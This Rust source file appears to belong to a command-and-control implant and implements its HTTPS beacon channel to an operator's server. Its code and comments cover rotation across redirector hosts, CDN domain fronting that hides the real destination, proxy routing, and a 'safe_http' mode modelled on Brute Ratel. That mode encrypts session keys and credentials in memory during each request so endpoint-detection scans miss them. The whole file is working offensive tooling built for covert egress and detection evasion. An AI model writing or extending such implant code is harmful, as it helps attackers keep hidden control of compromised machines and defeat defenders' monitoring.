//! HTTPS channel — the primary/default egress transport (spec-7 enhanced).
//!
//! Wraps `transport::post_frame_enhanced()` with CS 4.10-style host rotation,
//! domain fronting, explicit proxy support, and BRC4 v2.3-style safe_http
//! (memory encryption during the HTTP request window).
//!
//! ## Enhancements (spec-7)
//!
//! - **Host rotation**: `ctx.rotation_hosts` is a comma-separated list of
//!   redirector hosts. Each beacon cycle picks the next one (round-robin). On
//!   failure, the host is skipped (hold semantics). When empty, always uses
//!   `ctx.server_host`.
//! - **Domain fronting**: `ctx.fronting_host` overrides the HTTP `Host:`
//!   header. The TCP connection goes to the rotation/server host (a CDN IP),
//!   but the Host header and SNI carry the fronting domain — classic CDN
//!   domain-fronting technique.
//! - **Explicit proxy**: `ctx.proxy_server` (`"host:port"`) routes the request
//!   through a specified proxy instead of the system default.
//! - **safe_http** (BRC4 v2.3 alignment): During the WinHTTP request window
//!   (send → receive), all registered sensitive memory regions (config
//!   plaintext, session key, token cache) are RC4-encrypted in place. An EDR
//!   that triggers an ETW-based memory scan on network activity (the classic
//!   WinInet/WinHTTP scan trigger) sees ciphertext, not cleartext credentials.
//!   The frame body being sent is a temporary beacon-loop allocation, NOT in
//!   the registered-region table, so WinHTTP can still read it during the
//!   masked window. After the response is read, regions are unmasked.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use super::ChannelCtx;

/// Build-time toggle for safe_http. When `NYX_SAFE_HTTP=1` is set at build
/// time, the HTTPS channel wraps every POST in `mem::mask()` → WinHTTP →
/// `mem::unmask()`. Default off — operators opt in when they expect ETW-based
/// memory scanning triggered by network activity.
const fn safe_http_enabled() -> bool {
    match option_env!("NYX_SAFE_HTTP") {
        Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
        None => false,
    }
}

/// Send `frame` as an HTTPS POST to `/beacon` and return the response body.
///
/// When any spec-7 enhancement is configured (rotation_hosts, fronting_host,
/// proxy_server), uses the enhanced WinHTTP path (`post_frame_enhanced`).
/// Otherwise falls back to the plain `post_frame` for zero overhead.
///
/// When `NYX_SAFE_HTTP=1` is set at build time, the entire WinHTTP call is
/// wrapped in `mem::mask()` / `mem::unmask()` so registered sensitive regions
/// (config, session key) are RC4-encrypted during the network request window.
pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    // Determine which host to connect to this cycle.
    let host_bytes: &[u8] = match super::select_rotation_host(&ctx.rotation_hosts) {
        Some(h) => h,
        None => ctx.server_host.as_bytes(),
    };

    // Check if any enhancement is active.
    let has_fronting = !ctx.fronting_host.is_empty();
    let has_proxy = !ctx.proxy_server.is_empty();
    let has_rotation = !ctx.rotation_hosts.is_empty();
    let use_enhanced = has_fronting || has_proxy || has_rotation;

    // safe_http: mask registered sensitive regions (config/key/token) BEFORE
    // the WinHTTP call, unmask AFTER the response is fully read. The frame
    // body is a beacon-loop temporary — NOT in the registered-region table —
    // so WinHTTP can still send it during the masked window.
    //
    // This mirrors BRC4 v2.3's safe_http: "neither the Badger nor its thread
    // actually exists [in cleartext] until the HTTP transaction is fully parsed."
    // We can't achieve the full "thread doesn't exist" guarantee (that needs a
    // separate PIC stub), but we DO achieve "sensitive data is encrypted during
    // the request" — defeating ETW-triggered memory scans that fire on
    // WinHTTP/WinInet network activity.
    if safe_http_enabled() {
        crate::mem::mask();
    }

    let result = if use_enhanced {
        // Enhanced path: proxy + domain fronting + rotation.
        let opts = crate::transport::HttpOpts {
            fronting_host: if has_fronting {
                ctx.fronting_host.as_bytes()
            } else {
                b""
            },
            proxy_url: if has_proxy {
                ctx.proxy_server.as_bytes()
            } else {
                b""
            },
        };
        unsafe {
            crate::transport::post_frame_enhanced(
                host_bytes,
                ctx.server_port,
                b"/beacon",
                frame,
                ctx.use_tls,
                &opts,
            )
        }
    } else {
        // Fast path: no enhancements — plain post_frame.
        unsafe {
            crate::transport::post_frame(
                ctx.server_host.as_bytes(),
                ctx.server_port,
                b"/beacon",
                frame,
                ctx.use_tls,
            )
        }
    };

    if safe_http_enabled() {
        // Restore cleartext — mask() and unmask() are idempotent-guarded, so
        // this is safe even if mask() was a no-op (state was already clear).
        crate::mem::unmask();
    }

    // On failure with rotation active, advance past this host (CS 4.10 hold).
    if result.is_none() && has_rotation {
        super::advance_rotation_host();
    }

    result
}
